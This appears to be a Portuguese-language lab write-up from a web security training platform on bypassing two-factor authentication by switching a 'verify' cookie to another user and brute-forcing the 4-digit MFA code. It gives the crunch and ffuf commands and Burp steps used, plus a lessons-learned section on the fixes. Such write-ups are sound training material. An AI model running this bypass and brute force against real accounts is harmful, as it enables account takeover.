## Objetivo
burlar a autenticação do 2FA com lógica de sessão quebrada usando cookie validado pelo /login no /login2 sem validar e pedindo o mfa-code na vitima, 
depois fazer o brute force do mfa-code e pegar o response logado.

## Vulnerabilidade Identificada
É possivel direcionar um cookie autenticado q passou pela primeira fase de /login para uma outra credencial n logada como ``carlos``. 
conseguindo assim pedir mfa-code no servidor para o ``carlos``. E o mfa-code também não tem proteção contra brute o que facilitou a brute sem nenhuma necessidade de lógica de rate-limit 
## Comandos Utilizados

Primeiro eu criei a lista que eu iria usar para o brute force do mfa-code com crunch 4 4
```bash
crunch 4 4 0123456789 -o /home/luweed/Documents/otp.txt
```

Após criar a wordlist, e pedir o mfa-code para o carlos, usei ffuf para fazer a brute do mfa-code
```bash
     ffuf -w /home/luweed/Documents/otp.txt:FUZZ \
     -u https://0a7000bf037d3f08800026e800f000b5.web-security-academy.net/login2 \
     -X POST \
     -d "mfa-code=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Cookie: session=qBL1G83dNJ5f47Z6WE5rU1mfB9TsC0e8; verify=carlos" \
     -fc 200
    
```


``BURP-ONLY``
1. Após pegar o resultado do ffuf com o mfa-code de carlos. com a conta do wiener em /login2 coloque o mfa-code de carlos apenas para pegar a request do mfa-code 
2. Troque o verify da request por carlos.
3. No response pegue o novo cookie de autenticação do carlos em login/2 com o mfa-code aceito
4. Apos isso dei um GET com o repeater em /my-account?id=carlos com o novo cookie
5. Cliquei com o botão direito no response e depois em show in browser, copie o link e cole na url do firefox assim indo direto pra pagina de login e quebrando o lab.


## Resultado
<img width="1568" height="716" alt="image" src="https://github.com/user-attachments/assets/d4f35b09-125e-4038-87f5-f5723c7417fc" />


## Lições Aprendidas
Quando o servidor usa um cookie separado verify para rastrear qual usuário está no fluxo 2FA, sem validar se ele corresponde à sessão. é possível usar o mesmo cookie para outros usuários
e pular o fluxo 2FA. e também é muito importante mfa-code ter rate-limit para dificultar brute-force
